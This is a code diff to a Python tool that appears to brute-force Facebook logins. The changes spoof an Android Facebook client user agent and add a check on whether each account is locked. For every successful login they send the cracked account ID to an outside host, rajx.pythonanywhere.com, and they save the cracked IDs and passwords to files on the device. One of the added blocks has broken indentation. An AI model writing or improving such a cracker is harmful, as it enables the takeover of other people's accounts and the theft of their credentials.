@@ -34,7 +34,20 @@ loop = 0
 oks = []
 cps = []
 loop = 0
+ua = 'Davik/2.1.0 (Linux; U; Android 11.0.1; Infinix X688B Build/RP1A.200720.011) [FBAN/FB4A;FBAV/139.0.0.35.79;FBBV/890625930;FBDM/{density=2.0,width=1280,height=1440};;FBLC/en_GB;FBRV/410378857;FBCR/Zong;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X688B;FBSV/11;FBOP/16;FBCA/arm64-v8a:armeabi-v7a:armeabi;]',
 ugen=[]
+
+#-------checker------#
+def lock_check(uid):
+    sessionx=requests.Session()
+    urlx=f'https://www.facebook.com/p/{uid}'
+    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
+    tx=req.find('title').text
+    if tx =='Facebook':
+        return('LOCK')
+    else:
+        return('LIVE')
+        
 for xd in range(10000):
     aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -126,6 +139,10 @@ def test(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
+                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
+                if 'LOCK' in res:
+                    return 'LOCK'
+                else:
                 print(f'\r\33[1;92m[RJ-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                 oks.append(cid)
                 open('/sdcard/RJ-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
@@ -133,7 +150,7 @@ def test(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\r\33[1;92m[RJ-404-CP] {uid} ¤ {ps}")
+                print(f"\r\33[1;32m[RJ-404-CP] {uid} ¤ {ps}")
                 open('/sdcard/RJ-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
